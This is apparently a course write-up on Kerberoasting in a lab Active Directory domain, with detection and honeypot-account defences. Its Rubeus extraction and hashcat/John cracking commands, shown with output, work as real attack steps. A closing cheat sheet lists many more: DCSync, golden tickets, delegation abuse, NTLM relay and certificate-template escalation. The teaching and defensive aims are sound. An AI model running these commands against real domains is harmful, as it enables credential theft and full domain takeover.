
## Kerberoasting

在 Active Directory 中，**服务主体名称 (Service Principal Name, SPN)** 是一个唯一的服务实例标识符。Kerberos 使用 SPN 进行身份验证，以将服务实例与一个服务登录账户关联起来，这允许客户端应用程序在不拥有账户名称的情况下也能请求该服务对账户进行身份验证。当请求 Kerberos 的 **TGS (服务票据)** 时，它会使用该服务账户的 NTLM 密码哈希进行加密。

**Kerberoasting** 是一种后渗透攻击技术，通过获取服务票据并执行离线密码破解来“打开”（即解密/破解）票据，从而利用这一行为。如果票据被打开，那么用来打开票据的那个候选密码就是服务账户的密码。这种攻击的成功取决于服务账户密码的强度。另一个有一定影响的因素是创建票据时使用的加密算法，可能的选项有：

- **AES**
- **RC4**
- **DES**（在 15 年以上的老旧环境中使用，通常用于 2000 年代初期的遗留应用；否则，通常会被禁用）

这三种算法在破解速度上有显著差异，AES 比其他算法破解速度慢。虽然安全最佳实践建议禁用 RC4（如果启用了 DES 也应禁用），但大多数环境并未这样做。需要注意的是，并非所有应用程序供应商都已迁移支持 AES（大多数支持，但非全部）。默认情况下，KDC (密钥分发中心) 创建的票据将采用支持的最健壮/最高级别的加密算法。然而，攻击者可以强制降级回 RC4。

### 攻击路径

为了获取可破解的票据，我们可以使用 **Rubeus** 工具。当我们不指定用户而运行 `kerberoast` 操作时，它将提取所有已注册 SPN 的用户的票据（在大型环境中，这可以轻松达到数百个）：


```shell
PS C:\Users\demo\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : eagle.local
[*] Searching path 'LDAP://DC1.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 3


[*] SamAccountName         : Administrator
[*] DistinguishedName      : CN=Administrator,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : http/pki1
[*] PwdLastSet             : 07/08/2022 12.24.13
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt


[*] SamAccountName         : webservice
[*] DistinguishedName      : CN=web service,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : cvs/dc1.eagle.local
[*] PwdLastSet             : 13/10/2022 13.36.04
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\spn.txt
PS C:\Users\bob\Downloads>
```

然后，我们需要将提取的文件（包含票据）转移到 Kali Linux进行破解（这里我们只关注 Administrator 账户的票据，尽管 Rubeus 提取了两个）。

我们可以使用 **hashcat** 工具，哈希模式（选项 `-m`）指定为 **13100**，代表 **Kerberoastable TGS** (etype 23)。我们还传入一个包含密码的字典文件（文件 `passwords.txt`），并将所有成功破解的票据输出保存到一个名为 `cracked.txt` 的文件：



```bash
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
hashcat (v6.2.5) starting

<SNIP>

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: passwords.txt
* Passwords.: 10002
* Bytes.....: 76525
* Keyspace..: 10002
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$eagle.local$http/pki1@ea...42bb2c
Time.Started.....: Tue Dec 13 10:40:10 2022, (0 secs)
Time.Estimated...: Tue Dec 13 10:40:10 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   143.1 kH/s (0.67ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10002/10002 (100.00%)
Rejected.........: 0/10002 (0.00%)
Restore.Point....: 9216/10002 (92.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 20041985 -> Slavi123 # 注意：这里示例输出的是 Slavi123
Hardware.Mon.#1..: Util: 26%
Started: Tue Dec 13 10:39:35 2022
Stopped: Tue Dec 13 10:40:11 2022
```

（如果 hashcat 报错，我们可能需要在命令末尾加上 `--force` 参数。）

一旦 hashcat 完成破解，我们可以读取 `cracked.txt` 文件来查看明文密码 `Slavi123`：

```
cat cracked.txt
$krb5tgs$23$*Administrator$eagle.local$http/pki1@eagle.local*$ab<SNIP>:Slavi123
```

另外，捕获的 TGS 哈希可以使用 **John The Ripper** 进行破解：


```bash
sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) # 注意这里的 etype 23 对应 RC4
Node numbers 1-4 of 4 (fork)
Slavi123         (?)
Slavi123         (?)
```

### 防御 

这种攻击的成功取决于服务账户密码的强度。虽然我们应该限制具有 SPN 的账户数量并禁用那些不再使用/需要的账户，但我们**必须**确保它们有强密码。对于任何支持的服务，密码应为 100+ 个随机字符（AD 中允许的最大长度为 127），这能确保破解密码实际上是不可能的。

还有一种称为**组管理服务账户 (Group Managed Service Accounts, GMSA)** 的账户类型，它是 Active Directory 自动管理的一种特殊类型的服务账户；这是一个完美的解决方案，因为这些账户绑定到特定的服务器，其他用户无法在其他地方使用它们。此外，Active Directory 会自动将这些账户的密码轮换为 127 个随机字符的值。需要注意的是：并非所有应用程序都支持这些账户，它们主要与微软服务（如 IIS 和 SQL）以及少数其他已实现集成的应用程序配合使用。然而，我们应该尽可能在所有地方利用它们，并开始强制新服务使用它们，以便最终逐步淘汰现有账户。

如果不确定，不要给不需要 SPN 的账户分配 SPN。确保定期清理指向不再有效的服务/服务器的 SPN。

### 检测 

当请求 TGS 时，会生成事件 ID **4769** 的事件日志。然而，当用户尝试连接到任何服务时，AD 也会生成相同的事件 ID，这意味着这个事件的数量巨大，仅靠它作为检测方法几乎是不可能的。如果我们所处的环境所有应用程序都支持 AES 并且只生成 AES 票据，那么针对事件 ID 4769 发出警报会是一个极好的指标。如果票据选项设置为 RC4，也就是说，如果在 AD 环境中生成了 RC4 票据（这不是默认配置），那么我们应该对此发出警报并进行跟进。以下是我们请求票据以执行此攻击时记录的日志：

![[Pasted image 20250505001402.png]]

尽管此事件的总量相当大，我们仍然可以针对许多工具的默认选项发出警报。当我们运行 `Rubeus` 时，它会提取环境中每个已注册 SPN 的用户的票据；这使我们可以设置警报，例如，如果任何人在一分钟内生成超过十个票据（数量可以调整）。这个事件 ID 应该按请求票据的用户和发起请求的机器进行分组。理想情况下，我们需要创建两个独立的规则，同时对这两种情况发出警报。有两个用户具有 SPN，所以当我们执行 Rubeus 时，AD 生成了以下事件：

![[Pasted image 20250505001523.png]]

### 蜜罐用户

**蜜罐用户 (Honeypot user)** 是在 AD 环境中配置的一个完美的检测选项；这必须是一个在环境中没有实际用途/需求的账户，因此它不会定期生成服务票据。在这种情况下，任何尝试为该账户生成服务票据的行为都可能是恶意的，值得检查。使用此账户时需要确保几件事：

- 该账户必须是相对较老的账户，理想情况下是一个已失效的账户（高级威胁行为者不会请求新账户的票据，因为它们可能有强密码，并且可能是蜜罐用户）。
- 密码近期不应被更改过。一个好的目标是 2 年以上，理想情况下是 5 年或更长。但密码必须足够强，以便威胁代理无法破解它。
- 该账户必须分配一些权限；否则，获取它的票据就没有意义（假设高级攻击者只获取有趣账户/破解可能性更高的账户的票据，例如由于使用了旧密码）。
- 该账户必须注册了看起来合法的 SPN。IIS 和 SQL 账户是不错的选择，因为它们很普遍。

蜜罐用户的另一个额外益处是，与该账户相关的任何活动，无论是成功还是失败的登录尝试，都是可疑的，应予以警报。

如果我们回到演练环境，根据上述建议配置用户 `svc-iam`（可能是遗留的旧 IAM 账户），那么任何请求获取该账户 TGS 的行为都应发出警报：

![[Pasted image 20250505001734.png]]








## Cheetsheet
### # Kerberoasting

| Command                                                                                  | Description                                                              |
| ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| `.\Rubeus.exe kerberoast /outfile:spn.txt`                                               | Used to perform the Kerberoast attack and save output to a file.         |
| `hashcat -m 13100 -a 0 spn.txt passwords.txt`                                            | Uses `hashcat` to crack Keberoastable TGS tickets.                       |
| `sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot` | Uses `John the Ripper` to crack TGS tickets, and outputs to results.pot. |

### Asreproasting

|Command|Description|
|---|---|
|`.\Rubeus.exe asreproast /outfile:asrep.txt`|Used to perform the Asreproast attack and save the extracted tickets to a file.|
|`hashcat -m 18200 -a 0 asrep.txt passwords.txt --force`|Uses `hashcat` to crack AS-REP hashes that were saved in a file.|

### GPP Passwords

|Command|Description|
|---|---|
|`Import-Module .\Get-GPPPassword.ps1`|Used to import the `Get-GPPPassword.ps1` script into the current powershell session.|
|`Get-GPPPassword`|Cmdlet to automatically parse all XML files in the Policies folder in SYSVOL.|
|`Set-ExecutionPolicy Unrestricted -Scope CurrentUser`|Used to bypass powershell script execution policy.|

# Credentials in Shares

|Command|Description|
|---|---|
|`Import-Module .\PowerView.ps1`|Used to load the `PowerView.ps1` module into memory|
|`Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess`|PowerShell cmdlet used to identify shares in a domain|
|`findstr /m /s /i "eagle" *.ps1`|Forces a search within the current directory + subdirectories for the .ps1 file containing the string "eagle"|

# Credentials in Object Properties

|Command|Description|
|---|---|
|`.\SearchUser.ps1 -Terms pass`|Script to look for specific terms in the `Description` and `Info` fields of an AD object|

# DCSync

|Command|Description|
|---|---|
|`runas /user:eagle\rocky cmd.exe`|Start a new instance of `cmd.exe` as the user `eagle\rocky`.|
|`mimikatz.exe`|Tool used to implement the DCsync attack|
|`lsadump::dcsync /domain:eagle.local /user:Administrator`|Command used in `mimikatz` to DCSync and dump the `Administrator` password hash|

# Golden Ticket

|Command|Description|
|---|---|
|`lsadump::dcsync /domain:eagle.local /user:krbtgt`|Command used in `mimikatz` to DCSync and dump the `krbtgt` password hash|
|`Get-DomainSID`|Cmdlet from `PowerView` used to obtain the SID value of the domain.|
|`golden /domain:eagle.local /sid:<domain sid> /rc4:<rc4 hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt`|Command used in `mimikatz` to forge a golden ticket for the `Administrator` account and pass the ticket to the current session|
|`klist`|Command line utility in Windows to display the contents of the Kerberos ticket cache.|

# Kerberos Constrained Delegation

|Command|Description|
|---|---|
|`Get-NetUser -TrustedToAuth`|Cmdlet used to enumerate user accounts that are trusted for delegation in the domain|
|`.\Rubeus.exe hash /password:Slavi123`|Converts the plaintext password `Slavi123` to its NTLM hash equivalent|
|`.\Rubeus.exe s4u /user:webservice /rc4:<hash> /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt`|Using Rubeus to request a ticket for the `Administrator` account, by way of the `webservice` user who is trusted for delegation|
|`Enter-PSSession dc1`|Used to enter a new powershell remote session on the `dc1` computer|

# Print Spooler & NTLM Relaying

|Command|Description|
|---|---|
|`impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support`|Used to forward any connections to DC2 and attempt to perform DCsync attack|
|`python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123`|Used to trigger the PrinterBug|
|`RegisterSpoolerRemoteRpcEndPoint`|Registry key that can be disabled to prevent the PrinterBug|

# Coercing Attacks & Unconstrained Delegation

|Command|Description|
|---|---|
|`Get-NetComputer -Unconstrained \| select samaccountname`|PowerView command used to idenfity systems configred for Unconstrained Delegation.|
|`.\Rubeus.exe monitor /interval:1`|Used to monitor new logons and extract TGTs.|
|`Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local`|Used to perform a coercing attack towards DC1, forcing it to connect to WS001.|
|`mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`|Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host.|

# Object ACLs

|Command|Description|
|---|---|
|`setspn -D http/ws001 anni`|Removing the http/ws001 SPN from the anni user.|
|`setspn -U -s ldap/ws001 anni`|Setting a new SPN, ldap/ws001, on the anni user.|
|`setspn -S ldap/server02` server01|Setting a new SPN, ldap/server02, on the server01 machine.|

# PKI - ESC1

|Command|Description|
|---|---|
|`.\Certify.exe find /vulnerable`|Using the Certify.exe tool to scan for vulnerabilities in PKI infrastructure.|
|`.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator`|Using the Certify.exe tool to obtain a certifcate from the vulnerable template|
|`openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`|Command to convert a `PEM` certificate to a `PFX` certificate.|
|`.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt`|Using the Rubeus.exe tool to request a TGT for the domain Administrator by way of forged certifcate.|
|`runas /user:eagle\htb-student powershell`|Start a new instance as powershell as the htb-student user.|
|`New-PSSession PKI`|Start a new remote powershell session on the `PKI` machine.|
|`Enter-PSSession PKI`|Enter a remote powershell session on the `PKI` machine.|
|`Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}`|Using the Get-WinEvent cmdlet to view windows Event 4887|
|`$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}`|Command used to save the events into an array|
|`$events[0] \| Format-List -Property *`|Command to view events within the array. The `0` can be adjusted to a different number to match the corresponding event|

# PKI & Coercing - ESC8

|Command|Description|
|---|---|
|`impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs`|Command to forward incoming connections to the CA. The `--adcs` switch makes the tool parse and display the certificate if one is received.|
|`python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123`|Using the PrinterBug to trigger a connection back to the attacker.|
|`xfreerdp /u:bob /p:Slavi123 /v:172.16.18.25 /dynamic-resolution`|Connecting to WS001 from the Kali host using RDP.|
|`.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<b64 encoded cert>`|Using Rubeus.exe to ask for a TGT by way of base 64 encoded certificate.|
|`mimikatz.exe "lsadump::dcsync /user:Administrator" exit`|Using mimikatz.exe to DCsync the `administrator` user. This is performed once the TGT for DC2 has been passed to the current session.|
|`evil-winrm -i 172.16.18.15 -u htb-student -p 'HTB_@cademy_stdnt!'`|Connecting to PKI from the Kali Host using evil-winrm.|

# Windows Events

| Event ID | Description                                                                                                                                        |
| -------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| `4769`   | Event generated when a TGS is requested. Can be indicative of Kerberoasting.                                                                       |
| `4768`   | Event generated when a TGT is requested. Can be indicative of Asreproasting.                                                                       |
| `4625`   | Event generated when an account fails to log on.                                                                                                   |
| `4771`   | Event generated by a Kerberos pre-authentication failure.                                                                                          |
| `4776`   | Event generated when attempting to validate the credentials of an account.                                                                         |
| `5136`   | Event generated when a GPO is modified, if Directory Service Changes auditing is enabled.                                                          |
| `4725`   | Event generated when a user account is disabled.                                                                                                   |
| `4624`   | Event generated when an account successfully logs on to a windows computer. The S4U extension notes the presence of delegation.                    |
| `4662`   | Event generated by a possible DCsync attack. If the account name is not a domain controller, it serves as a flag that a user generated the attack. |
| `4738`   | Event generated when a user account is changed. Any association of this event with a honeypot user should trigger an alert.                        |
| `4742`   | Event generated when a computer account is changed.                                                                                                |
| `4886`   | Event generated when a certificate is requested.                                                                                                   |
| `4887`   | Event generated when a certificate is approved and issued.                                                                                         |